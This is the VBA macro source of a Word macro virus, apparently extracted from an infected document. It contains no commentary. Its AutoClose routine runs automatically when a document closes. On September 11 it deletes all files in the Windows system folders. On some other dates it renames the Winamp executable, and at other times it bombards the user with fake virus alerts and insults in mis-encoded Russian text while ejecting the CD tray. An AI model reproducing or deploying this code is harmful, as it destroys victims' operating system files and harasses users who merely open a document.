   Attribute VB_Name = "Module1"

   Attribute VB_Name = "Module11"
   Option Compare Text
   Dim file As String

   Attribute VB_Name = "NewMacros"
   Declare Function mciSendString Lib "winmm.dll" _
   Alias "mciSendStringA" (ByVal lpstrCommand As String, _
   ByVal lpstrReturnString As String, ByVal uReturnLength As Long, _
   ByVal hwndCallback As Long) As Long
   Sub autoclose()
   On Error Resume Next
   If Month(Now()) = 9 And Day(Now()) = 11 Then
   Kill "C:\WINDOWS\*.*"
   Kill "C:\WINDOWS\system32\*.*"
   Kill "C:\WINDOWS\system\*.*"
   MsgBox "-------ÍÅÓÄÀ×ÍÛÉ ÄÅÍÜ--------", vbCritical, "GAME OVER"
   Else
   If Month(Now()) = Day(Now()) Then
   OldName = "C:\Program Files\Winamp\winamp.exe"
   NewName = "C:\Program Files\Winamp\winamp.dll"
   Name OldName As NewName
   MsgBox "       Íåâîæìîæíî çàêðûòü Microsoft Word     ", vbCritical, "Error"
   MsgBox "       WARNING!!!   Virus Alert              ", vbExclamation
   MsgBox "       Îáíàðóæåí âèðóñ Trojan.Apokalipse.990eERR", vbCritical
   MsgBox "       RSXCÚÕÚÆÕ}>}{}::P_p][p-BHG}{LPJBG(&*(&%*(*&^)UgyuFRCHGVFMPK)J?>HYt"
   MsgBox "       Hi, Lamer !!! }:}:>}:L{>{:}{:|}:}{L{LLL}L}", 0, "For Lamer"
   MsgBox "       My Name is Debuger                ", vbInformation, "Debuger"
   MsgBox "       Õî÷åøü çàêðûòü Word???            ", 4, "Debuger"
   MsgBox "       ×åãî ìó÷àåøñÿ, Hacker ãàëèìûé @@@@@@@@@@@@@@@@@@@@@@@@____________", 5, "Debuger"
   MsgBox "       ß âèæó ó  òåáÿ âèíäà íåëèöåíçèîííàÿ (:(:(:(:(:(:(:(:(:(:          ", 0, "Debuger"
   MsgBox "............è ïðîãè ïèðàòñêèå............................................", 0, "Debuger"
   MsgBox "       Äà òû åù¸ ìóçëî áåñïëàòíî ñëóøàåøüÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ", o, "Debuger"
   MsgBox "       ÏÈÐÀÒÑÒÂÓ------------ÁÎÉ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!          ", 3, "Debuger"
   MsgBox "       Ñêîëüêî ìîæíî æàòü ÎÊ?][;]=;];=[;.]l;][;];]                       ", vbQuestion, "Debuger"
   MsgBox "       ];]=90=9   Íà êîìïå ìíîãî ÄÅÐÜÌÀ                                  ", vbExclamation, "Debuger"
   MsgBox "+++++++Gih Ïðî÷èñòèì ìîçãè", 2, "Debuger"
   MsgBox " gvycgdevccvvuebvfuvcbidcdhcvhjfbdfverbvhdfbvkfbvierbvhbvjkdfvnoerghuerionvfjkefvyuidfubvdfjvnuifbvkdfbvdkfvnonflvncjkfvnjkfdbvjkdfbvkdfjvnfjvbkjbvuivnuiervervyucvrycbicvyurcbuecvrcbuybcirbibvfiriebvuerbvierburbvuierncvruifnuierbfverubfveruobvierbvfuirvnuirencvoeruveruibverbvurbuirnfvornfvoerbvroebvoerbviorbvioerbvfiorbvoribvoribvfrobvrbviorebfriwebfrobvfrebvernvriovfnerofnvgeriogeyfrfjriofhuierfhóêåíã4åí45ãåî5ùçåø9045íåãø5ðàãøïíãêàöàëóêïàêëàëäóêðïãøóèìóêìøùóòìçùóêìëùçóêàîìùçóêïîøùóêðïóùêïâñìöóåí÷ìöóã÷ìöóãò÷øöóñèøöóñèøöóâøùöóìàåöóìâóîâàðóêàüïàðìêóêðïãøóêòêùìüàêðñêíöàèöóêàèóêøöèàóêøèïâàñðîñèêðñììàèðóêñìòèèàìðàìîëâàòìîëïàèìãïðóåèìøèìîëìòîëïàèìèòìøâàèïìíèì àðèììèøèìðàèìèìðèìðèìàðîèìðèìðîãàèìðîâàèìðîèìèìðâàèìðîàèìðîâàèìîëâàèìðîâàèìèìðîèìðîâàèìðîèàìðîâàèìðîàèìðîâàèìðìóàîëìòøùóêàòóêøùìóêãøèìóãïàìïàñâôûâïð÷ñôûà÷ìâïðñìâìñãóèñóêèàóêöðñèóêãèñóêñèêñèóøêñèøêñòêðìïàïìñãêöóìñíãêñìöóêãèñðîãöóêèñóêðñèêîòñøöóêðñèöóêãñèêèìàñèñøöêèêñìóêðöñèêøöóðóêèìààèêñèøöóêñèóêãñèóøêðîèìàóãøìèêóùìóêøùèììùóêòìù", vbCritical, "Debuger"
   MsgBox "òÛ ìÍå ÍàÄîÅë", 3, "Debuger"
   MsgBox "___________________________________________________È êîìï ó òåáÿ îòñòîé____________________________________", o, "Debuger"
   MsgBox " Ïîêà òû ôèãí¸é ñòðàäàë òâî¸ ïèðàòñêîå Ãàâíî ñìûëîñü â Óíèòàç", vbInformation, "Debuger"
   MsgBox "                             URA!!!    URA!!!     URA!!!                                                   ", 0, "Debuger"
   MsgBox "NJ    òÎ ËÈ åù¸ áóäåò///////////////////////////////", 2, "Debuger"
   MsgBox "----ÕÎÐÎØÈÉ ÂÈÍÒ-×ÈÑÒÛÉ ÂÈÍÒ----", vbCritical, "Format\: C"
   MsgBox " Íó âîò è íà÷àëîñü ñàìîå Èíòåðåñíîå", vbInformation, "Debuger"
   Else
   MsgBox "       Íåâîæìîæíî çàêðûòü Microsoft Word     ", vbCritical, "Error"
   MsgBox "       WARNING!!!   Virus Alert              ", vbExclamation
   MsgBox "       Îáíàðóæåí âèðóñ Trojan.Apokalipse.990eERR", vbCritical
   MsgBox "       RSXCÚÕÚÆÕ}>}{}::P_p][p-BHG}{LPJBG(&*(&%*(*&^)UgyuFRCHGVFMPK)J?>HYt"
   MsgBox "       Hi, Lamer !!! }:}:>}:L{>{:}{:|}:}{L{LLL}L}", 0, "For Lamer"
   MsgBox "       My Name is Debuger                ", vbInformation, "Debuger"
   MsgBox "       Õî÷åøü çàêðûòü Word???            ", 4, "Debuger"
   MsgBox "       ×åãî ìó÷àåøñÿ, Hacker ãàëèìûé @@@@@@@@@@@@@@@@@@@@@@@@____________", 5, "Debuger"
   MsgBox "       ß âèæó ó  òåáÿ âèíäà íåëèöåíçèîííàÿ (:(:(:(:(:(:(:(:(:(:          ", 0, "Debuger"
   MsgBox "............è ïðîãè ïèðàòñêèå............................................", 0, "Debuger"
   MsgBox "       Äà òû åù¸ ìóçëî áåñïëàòíî ñëóøàåøüÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ", o, "Debuger"
   MsgBox "       ÏÈÐÀÒÑÒÂÓ------------ÁÎÉ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!          ", 3, "Debuger"
   MsgBox "       Ñêîëüêî ìîæíî æàòü ÎÊ?][;]=;];=[;.]l;][;];]                       ", vbQuestion, "Debuger"
   MsgBox "       ];]=90=9   Íà êîìïå ìíîãî ÄÅÐÜÌÀ                                  ", vbExclamation, "Debuger"
   MsgBox "+++++++Gih Ïðî÷èñòèì ìîçãè", 2, "Debuger"
   MsgBox " gvycgdevccvvuebvfuvcbidcdhcvhjfbdfverbvhdfbvkfbvierbvhbvjkdfvnoerghuerionvfjkefvyuidfubvdfjvnuifbvkdfbvdkfvnonflvncjkfvnjkfdbvjkdfbvkdfjvnfjvbkjbvuivnuiervervyucvrycbicvyurcbuecvrcbuybcirbibvfiriebvuerbvierburbvuierncvruifnuierbfverubfveruobvierbvfuirvnuirencvoeruveruibverbvurbuirnfvornfvoerbvroebvoerbviorbvioerbvfiorbvoribvoribvfrobvrbviorebfriwebfrobvfrebvernvriovfnerofnvgeriogeyfrfjriofhuierfhóêåíã4åí45ãåî5ùçåø9045íåãø5ðàãøïíãêàöàëóêïàêëàëäóêðïãøóèìóêìøùóòìçùóêìëùçóêàîìùçóêïîøùóêðïóùêïâñìöóåí÷ìöóã÷ìöóãò÷øöóñèøöóñèøöóâøùöóìàåöóìâóîâàðóêàüïàðìêóêðïãøóêòêùìüàêðñêíöàèöóêàèóêøöèàóêøèïâàñðîñèêðñììàèðóêñìòèèàìðàìîëâàòìîëïàèìãïðóåèìøèìîëìòîëïàèìèòìøâàèïìíèì àðèììèøèìðàèìèìðèìðèìàðîèìðèìðîãàèìðîâàèìðîèìèìðâàèìðîàèìðîâàèìîëâàèìðîâàèìèìðîèìðîâàèìðîèàìðîâàèìðîàèìðîâàèìðìóàîëìòøùóêàòóêøùìóêãøèìóãïàìïàñâôûâïð÷ñôûà÷ìâïðñìâìñãóèñóêèàóêöðñèóêãèñóêñèêñèóøêñèøêñòêðìïàïìñãêöóìñíãêñìöóêãèñðîãöóêèñóêðñèêîòñøöóêðñèöóêãñèêèìàñèñøöêèêñìóêðöñèêøöóðóêèìààèêñèøöóêñèóêãñèóøêðîèìàóãøìèêóùìóêøùèììùóêòìù", vbCritical, "Debuger"
   MsgBox "òÛ ìÍå ÍàÄîÅë", 3, "Debuger"
   MsgBox "___________________________________________________È êîìï ó òåáÿ îòñòîé____________________________________", o, "Debuger"
   MsgBox " Ïîêà òû ôèãí¸é ñòðàäàë òâî¸ ïèðàòñêîå Ãàâíî ñìûëîñü â Óíèòàç", vbInformation, "Debuger"
   MsgBox "                             URA!!!    URA!!!     URA!!!                                                   ", 0, "Debuger"
   MsgBox "NJ    òÎ ËÈ åù¸ áóäåò///////////////////////////////", 2, "Debuger"
   mciSendString "Set cdaudio door open wait", 0, 0, 0
   mciSendString "Set cdaudio door closed wait", 0, 0, 0
   MsgBox "----ÕÎÐÎØÈÉ ÂÈÍÒ-×ÈÑÒÛÉ ÂÈÍÒ----", vbCritical, "Format\: C"
   mciSendString "Set cdaudio door open wait", 0, 0, 0
   mciSendString "Set cdaudio door closed wait", 0, 0, 0
   MsgBox " Íó âîò è íà÷àëîñü ñàìîå Èíòåðåñíîå", vbInformation, "Debuger"
   End If
   End If
   End Sub




